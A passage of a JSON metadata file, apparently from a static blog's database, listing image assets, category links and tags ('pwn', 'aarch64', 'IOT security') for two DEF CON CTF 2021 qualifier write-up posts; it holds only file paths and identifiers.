00003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/T0myzaL.png","slug":"T0myzaL.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/Z8LVbx5.png","slug":"Z8LVbx5.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-mra/iSM4UfH.png","slug":"iSM4UfH.png","post":"ckyotnyi100003ngk9k5vcpkb","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-nooopster/62rKHoR.png","slug":"62rKHoR.png","post":"ckyqf585k00008agk0fsn123b","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-nooopster/8tJ74WV.png","slug":"8tJ74WV.png","post":"ckyqf585k00008agk0fsn123b","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-nooopster/BT4KL7X.png","slug":"BT4KL7X.png","post":"ckyqf585k00008agk0fsn123b","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-nooopster/Jbt611q.png","slug":"Jbt611q.png","post":"ckyqf585k00008agk0fsn123b","modified":0,"renderable":0},{"_id":"source/_posts/defcon-ctf-2021-quals-nooopster/Z1zFFtl.png","slug":"Z1zFFtl.png","post":"ckyqf585k00008agk0fsn123b","modified":0,"renderable":0}],"PostCategory":[{"post_id":"ckyotnyi100003ngk9k5vcpkb","category_id":"ckyqg1c4j0001b8gk9e8jex2v","_id":"ckyqg1c4q0004b8gk8eu56qz9"},{"post_id":"ckyqf585k00008agk0fsn123b","category_id":"ckyqg1c4j0001b8gk9e8jex2v","_id":"ckyqg1c4q0005b8gk8ppq7xmh"},{"post_id":"ckyopyh2100019kgk1rfo2613","category_id":"ckyqg1c4p0003b8gk1dcm1obe","_id":"ckyqg1c4q0006b8gkhuigb3p5"}],"PostTag":[{"post_id":"ckyopyh2100019kgk1rfo2613","tag_id":"ckyopyh2800049kgk43nx625a","_id":"ckyopyh2b00069kgkhyqucv5w"},{"post_id":"ckyopyh2100019kgk1rfo2613","tag_id":"ckyopyh2a00059kgkg0z488fm","_id":"ckyopyh2b00079kgk13u6dr7t"},{"post_id":"ckyotnyi100003ngk9k5vcpkb","tag_id":"ckyotnyi600013ngk3sp3euv2","_id":"ckyotnyi800033ngk6sg82kho"},{"post_id":"ckyotnyi100003ngk9k5vcpkb","tag_id":"ckyopyh2a00059kgkg0z488fm","_id":"ckyotnyi800043ngka1tx3nxk"},{"post_id":"ckyotnyi100003ngk9k5vcpkb","tag_id":"ckyotnyi800023ngk6v113317","_id":"ckyotnyi900053ngkhl051t3m"},{"post_id":"ckyqf585k00008agk0fsn123b","tag_id":"ckyotnyi600013ngk3sp3euv2","_id":"ckyqf585o00018agk21k22l65"},{"post_id":"ckyqf585k00008agk0fsn123b","tag_id":"ckyopyh2a00059kgkg0z488fm","_id":"ckyqf585o00028agk87n55guy"}],"Tag":[{"name":"IOT security","_id":"ckyopyh2800049kgk43nx625a"},{"name":"pwn","_id":"ckyopyh2a00059kgkg0z488fm"},{"name":"defcon ctf 2021 quals","_id":"ckyotnyi600013ngk3sp3euv2"},{"name":"aarch64","_id":"ckyotnyi800023ngk6v113317"}]}}